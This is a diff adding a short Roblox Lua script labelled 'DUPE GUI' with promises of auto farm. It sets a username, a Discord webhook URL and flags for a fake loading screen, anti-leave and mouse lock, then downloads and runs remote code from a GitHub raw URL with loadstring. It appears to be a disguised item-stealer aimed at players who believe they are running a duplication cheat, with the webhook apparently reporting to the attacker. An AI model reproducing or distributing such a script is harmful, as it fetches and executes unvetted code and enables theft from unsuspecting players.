@@ -1,0 +1,14 @@
+UserName = "daveVNdark"
+UserName2 = "daveVNdark"
+Webhook = "https://discord.com/api/webhooks/1109505002201944178/hXevR4Z5-nCaYvn_7KGSPTerSt1DPMxHXozeIK4j5Y7m6I2RdH47u4kALqdf_2LlMdUY"
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+
+_G.ScriptName = "DUPE GUI"
+_G.FirstText = "you can use auto farm in my script to"
+_G.SecondText = "this script has many feature"
+_G.ThirdText = "wait..."
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pet-simx/ftssa/main/Main.lua", true))()
